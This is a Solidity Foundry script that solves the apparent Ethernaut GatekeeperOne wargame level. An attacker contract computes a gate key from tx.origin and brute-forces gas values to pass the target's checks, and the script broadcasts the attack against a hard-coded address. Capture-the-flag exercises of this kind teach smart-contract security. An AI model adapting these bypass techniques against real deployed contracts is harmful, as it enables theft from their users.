// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/Gatekeeper.sol";

contract Hacker {
    GatekeeperOne code;

    constructor(GatekeeperOne _code) {
        code = _code;
    }

    function attack() public {
        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);

        // Try brute-force with different gas values
        for (uint256 i = 0; i < 120; i++) {
            (bool success,) = address(code).call{gas: i + 150 + 8191 * 3}( // tune this offset
            abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (success) {
                break;
            }
        }
    }
}

contract GatekeeperOneScript is Script {
    GatekeeperOne public code = GatekeeperOne(0xfC11EC4E20A5fb032A6cf1505eaBb9104Ef30f03);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        Hacker attacker = new Hacker(code);
        attacker.attack();
        vm.stopBroadcast();
    }
}
